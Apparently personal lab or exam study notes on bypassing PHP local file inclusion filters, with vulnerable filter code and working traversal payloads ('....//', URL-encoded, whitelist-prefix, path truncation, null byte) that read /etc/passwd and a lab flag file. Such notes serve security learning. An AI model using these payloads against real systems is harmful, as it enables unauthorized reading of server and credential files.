## Why Bypasses Are Needed

Many applications apply **weak input filters** to stop LFI.  
These filters usually **look secure but are logically broken**.

If input is not **strictly validated and canonicalized**, LFI is still exploitable.

---

## 1. Non-Recursive Path Traversal Filter

### Vulnerable Filter Example

```php
$language = str_replace('../', '', $_GET['language']);
```

### Why This Is Broken

- Filter runs **only once**
- Does **not re-check output**
- Allows **recursive reconstruction** of `../`

### Bypass Technique

Use payloads that collapse **after filtering**:

```
....//  → becomes ../ after filter
```

### Exploit Payload

```
index.php?language=....//....//....//....//etc/passwd


http://94.237.58.137:51879/index.php?language=....//....//....//....//....//....//....//....//flag.txt
```

### Result

- Filter removes `../`
- Remaining payload reconstructs traversal
- `/etc/passwd` is read successfully

Other working variants:

```
..././
....\/
....////
```

---

## 2. URL Encoding Bypass

Core PHP filters on versions 5.3.4 and earlier were specifically vulnerable to this bypass, but even on newer versions we may find custom filters that may be bypassed through URL encoding.

### When to Use

- App blocks `.` or `/`
- Custom blacklist filters
- Old PHP versions or sloppy decoding

### Encoding Traversal

```
../  →  %2e%2e%2f
```

### Full Payload Example

```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### URL Example

```
index.php?language=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Notes

- Encode **everything**, including dots
- **Double encoding may work against stricter filters**
- Burp Decoder is ideal for this

---

## 3. Approved Path (Whitelist) Bypass

Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the `./languages` directory, as follows:

### Example Whitelist Filter

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
}
```

**To find the approved path, we can examine the requests sent by the existing forms, and see what path they use for the normal web functionality. Furthermore, we can fuzz web directories under the same path, and try different ones until we get a match.**

### Logic Flaw

- Only checks **starting path**
- Does not prevent traversal **after approval**

### Bypass Payload

```
./languages/../../../../etc/passwd

http://94.237.58.137:51879/index.php?language=languages/../../../../../../../../flag.txt
```

### Result

- Passes regex
- Traverses out
- Reads arbitrary files

Some web applications may apply this filter along with one of the earlier filters, so we may combine both techniques by starting our payload with the approved path, and then URL encode our payload or use recursive payload.

---

## 4. Appended Extension Bypass (Old PHP)

There are a couple of other techniques we may use, but they are `obsolete with modern versions of PHP and **only work with PHP versions before 5.3/5.4**`.

As discussed in the previous section, some web applications append an extension to our input string (e.g. `.php`), to ensure that the file we include is in the expected extension.

### Scenario

```php
include($_GET['language'] . ".php");
```

### Direct Read Fails

```
/etc/passwd.php ❌
```

---

### 4.1 Path Truncation (PHP < 5.3)

#### Why It Works

- Max path length ≈ 4096 chars
- Extra characters are truncated
- `.php` gets dropped

#### Payload Pattern

```
non_existing/../../../etc/passwd/././././... (repeated ~2048 times)
```

It is also important to note that we would also need to `start the path with a non-existing directory` for this technique to work.

#### Automation Example

```bash
echo -n "non_existing/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

⚠️ Obsolete on modern PHP, but **still appears in legacy systems**

---

### 5.2 Null Byte Injection (PHP < 5.5)

#### Concept

- `%00` terminates string
- Anything after is ignored

#### Payload

```
/etc/passwd%00
```

#### Final Path Evaluated

```
/etc/passwd
```

⚠️ **Fully patched in modern PHP**

---

## 6. Combining Bypasses (Real-World)

Real apps often stack filters:

- Path whitelist
- `../` removal
- Extension appending

### Combined Payload Example

```
./languages/....//....//etc/passwd


http://94.237.58.137:51879/index.php?language=languages//....//....//....//....//....//....//....//....//flag.txt
```

or

```
./languages/%2e%2e%2f%2e%2e%2fetc%2fpasswd

http://94.237.58.137:51879/index.php?language=languages/%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%66%6c%61%67%2e%74%78%74
```

---

## 7. Attacker Mindset (Exam Logic)

When LFI fails, ask:

1. Is `../` filtered?
2. Is filtering recursive?
3. Is URL decoding happening later?
4. Is there a whitelisted base path?
5. Is extension appended?
6. Is PHP old?

---

## 8. Key Takeaway

> **Most LFI protections are cosmetic.**  
> They hide the vulnerability, they don’t remove it.

If the app:

- Uses string replacement
- Uses regex path checks
- Trusts decoded input

➡️ **You can bypass it.**

---

## 9. One-Line Memory Hook

> _“If input reaches include(), filtering is already too late.”_


---
Example

```
http://94.237.58.137:51879/index.php?language=languages/%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%66%6c%61%67%2e%74%78%74

http://94.237.58.137:51879/index.php?language=languages//....//....//....//....//....//....//....//....//flag.txt

Original - http://94.237.58.137:51879/index.php?language=languages/en.php
```

![[Pasted image 20251218173748.png]]

